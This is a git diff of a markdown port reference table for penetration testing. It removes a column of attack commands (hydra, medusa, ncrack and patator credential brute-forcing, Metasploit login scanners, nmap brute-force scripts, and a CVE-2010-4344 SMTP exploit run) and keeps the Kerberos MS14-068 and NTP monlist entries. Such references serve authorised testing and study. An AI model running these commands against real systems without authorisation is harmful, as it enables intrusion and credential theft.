@@ -1,7 +1,7 @@
 # Ports
 
-|**Port Number**|**Protocol**|**Service & Application**|**Commands**|
-|:--------------|:-----------|:------------------------|:-----------|
+|**Port Number**|**Protocol**|**Service & Application**|
+|:--------------|:-----------|:------------------------|
 |1|tcp|blackice||
 |7|tcp|echo||
 |11|tcp|systat||
@@ -9,10 +9,10 @@
 |15|tcp|netstat||
 |17|tcp|quote of the day||
 |19|tcp|character generator||
-|21|tcp|ftp|nmap --script ftp-anon `target`<BR> hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp<BR>ncrack –v -U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103:21<BR>medusa -h 192.168.1.103 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M ftp<BR>patator ftp_login host=192.168.1.103 user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt<BR>use auxiliary/scanner/ftp/ftp_login||
-|22|tcp|ssh|msf > use auxiliary/scanner/ssh/ssh_login<BR>nmap --script ssh2-enum-algos 192.168.108.197<BR>nmap --script ssh-hostkey 192.168.108.197<BR>nmap --script sshv1 192.168.108.197|
-|23|tcp|telnet|msf > use auxiliary/scanner/telnet/telnet_login<BR>nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s `target`<BR>nmap -p 23 --script telnet-encryption `target`<BR>nmap -p 23 --script telnet-ntlm-info `target`|
-|25|tcp|smtp|nmap -p 25 --script smtp-brute `target`<BR>nmap --script smtp-commands.nse [--script-args smtp-commands.domain=`domain`] -pT:25,465,587 `target`<BR>nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com `target`<BR>nmap --script smtp-open-relay.nse [--script-args smtp-open-relay.domain=`domain`,smtp-open-relay.ip=`address`,...] -p 25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=`domain`' -pT:25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 `target`|
+|21|tcp|ftp|||
+|22|tcp|ssh||
+|23|tcp|telnet||
+|25|tcp|smtp||
 |26|tcp|ssh||
 |37|tcp|rdate||
 |49|tcp|TACACS+||
@@ -31,7 +31,7 @@
 |88|tcp|Kerberos|use auxiliary/admin/kerberos/ms14_068_kerberos_checksum|
 |102|tcp|Siemens S7||
 |110|tcp|pop3||
-|111|tcp|RPC|rpcinfo -p 192.168.1.111<BR>msf >use auxiliary/scanner/nfs/nfsmount|
+|111|tcp|RPC|
 |119|tcp|NNTP||
 |123|tcp|NTP||
 |123|udp|ntp|ntpdc -n -c monlist `target`<BR>nmap -sU -p 123 -Pn -n --script ntp-info `target`<BR>nmap -sU -p 123 -Pn -n --script ntp-monlist `target`<BR>msf > use auxiliary/scanner/ntp/ntp_readvar|
